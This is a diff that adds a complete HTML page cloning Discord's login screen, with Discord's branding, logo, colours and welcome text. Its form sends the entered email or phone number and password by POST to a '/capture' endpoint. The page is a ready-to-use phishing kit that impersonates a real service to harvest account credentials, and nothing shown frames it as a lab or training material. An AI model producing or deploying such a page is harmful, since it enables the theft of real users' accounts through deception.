@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Discord — Login</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;700&display=swap');
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{
+    --bg:#313338;
+    --card-bg:#2b2d31;
+    --input-bg:#1e1f22;
+    --blurple:#5865f2;
+    --blurple-hover:#4752c4;
+    --text:#dbdee1;
+    --text-muted:#b5bac1;
+    --text-dark:#060607;
+    --link:#00a8fc;
+    --error:#f23f43;
+    --label-color:#b5bac1;
+  }
+  body{
+    background:var(--bg);
+    font-family:'gg sans','Noto Sans',sans-serif;
+    display:flex;align-items:center;justify-content:center;
+    min-height:100vh;padding:16px
+  }
+  .card{
+    background:var(--card-bg);border-radius:8px;
+    box-shadow:0 2px 10px rgba(0,0,0,.5),0 8px 32px rgba(0,0,0,.3);
+    display:flex;overflow:hidden;width:784px;max-width:100%;min-height:460px
+  }
+  /* Left panel — form */
+  .left{
+    flex:1;padding:32px 40px;
+    display:flex;flex-direction:column;justify-content:center
+  }
+  h1{
+    color:#fff;font-size:1.5rem;font-weight:700;
+    text-align:center;margin-bottom:8px
+  }
+  .sub{
+    color:var(--text-muted);font-size:.875rem;
+    text-align:center;margin-bottom:20px
+  }
+  .field{margin-bottom:16px}
+  .field label{
+    display:block;font-size:.75rem;font-weight:700;
+    color:var(--label-color);text-transform:uppercase;
+    letter-spacing:.04em;margin-bottom:8px
+  }
+  .req{color:var(--error);margin-left:2px}
+  .field input{
+    width:100%;background:var(--input-bg);
+    border:1px solid rgba(0,0,0,.3);border-radius:3px;
+    padding:10px;font-size:1rem;color:var(--text);
+    font-family:inherit;outline:none;
+    transition:border .15s
+  }
+  .field input:focus{border-color:var(--blurple);box-shadow:0 0 0 0px var(--blurple)}
+  .field input:hover:not(:focus){border-color:rgba(0,0,0,.5)}
+  .forgot{
+    display:inline-block;font-size:.75rem;color:var(--link);
+    text-decoration:none;margin-bottom:20px
+  }
+  .forgot:hover{text-decoration:underline}
+  .btn-login{
+    width:100%;background:var(--blurple);color:#fff;
+    border:none;border-radius:3px;padding:11px 16px;
+    font-size:1rem;font-weight:500;font-family:inherit;
+    cursor:pointer;transition:background .15s
+  }
+  .btn-login:hover{background:var(--blurple-hover)}
+  .btn-login:active{background:#3c45a5;transform:translateY(1px)}
+  .register{
+    margin-top:8px;font-size:.875rem;
+    color:var(--text-muted)
+  }
+  .register a{color:var(--link);text-decoration:none}
+  .register a:hover{text-decoration:underline}
+  .qr-link{
+    display:flex;align-items:center;justify-content:center;
+    gap:6px;margin-top:20px;padding-top:16px;
+    border-top:1px solid rgba(255,255,255,.06);
+    font-size:.875rem;color:var(--link);text-decoration:none;cursor:pointer
+  }
+  .qr-link:hover{text-decoration:underline}
+  /* Right panel — branding */
+  .right{
+    width:260px;background:#23272a;
+    display:flex;align-items:center;justify-content:center;
+    padding:24px;flex-shrink:0
+  }
+  .right-inner{text-align:center}
+  .right-inner svg{width:180px;height:180px;opacity:.9}
+  @media(max-width:620px){.right{display:none}.left{padding:24px}}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="left">
+    <h1>Welcome back!</h1>
+    <p class="sub">We're so excited to see you again!</p>
+    <form method="POST" action="/capture" autocomplete="on">
+      <div class="field">
+        <label>Email or Phone Number <span class="req">*</span></label>
+        <input name="email" type="text" required autocomplete="username" autofocus>
+      </div>
+      <div class="field">
+        <label>Password <span class="req">*</span></label>
+        <input name="password" type="password" id="pw" required autocomplete="current-password">
+      </div>
+      <a href="#" class="forgot">Forgot your password?</a>
+      <button type="submit" class="btn-login">Log In</button>
+      <p class="register">Need an account? <a href="https://discord.com/register">Register</a></p>
+    </form>
+    <a href="#" class="qr-link">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="#00a8fc"><path d="M3 11h8V3H3v8zm2-6h4v4H5V5zm8-2v8h8V3h-8zm6 6h-4V5h4v4zM3 21h8v-8H3v8zm2-6h4v4H5v-4zm13 0h-3v2h2v2h-2v2h4v-4h-1v-2zm-4-2h2v2h-2v-2zm2 4h2v2h-2v-2zm-4 4v-2h2v2h-2z"/></svg>
+      Log in with QR Code
+    </a>
+  </div>
+  <div class="right">
+    <div class="right-inner">
+      <svg viewBox="0 0 245 240" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#5865f2" d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zm36.5 0c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z"/>
+        <path fill="#5865f2" d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-.1 20.2 1.7 9.5 2.5 19.7 7 30.1 15.5 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z"/>
+      </svg>
+    </div>
+  </div>
+</div>
+</body>
+</html>
